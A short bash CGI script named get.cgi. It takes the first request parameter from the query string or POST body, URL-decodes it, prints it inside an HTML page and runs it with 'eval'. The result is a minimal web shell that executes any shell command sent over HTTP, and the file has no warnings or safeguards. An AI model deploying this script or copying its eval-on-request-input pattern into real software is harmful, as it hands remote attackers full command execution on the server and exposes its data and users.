#!/bin/bash
#get.cgi

echo "content-type:text/html;charset=utf-8"
echo

echo "<html>"
echo "<head>"
echo "<style>"
echo "*{font-family:微软雅黑}"
echo "</style>"
echo "</head>"
echo "<body>"
echo "<pre>"

if [ $REQUEST_METHOD = 'POST' ]
then
	QUERY_STRING=`cat -`
fi

qs=$QUERY_STRING

code=`echo $qs|sed 's/=/ /g'|awk '{print $2}'|sed 's/+/ /g'|sed -e 's/%\(\)/\\\x/g'`
str=`printf "${code}"`
echo $str
eval $str

echo "</pre>"
echo "</body>"
echo "</html>"

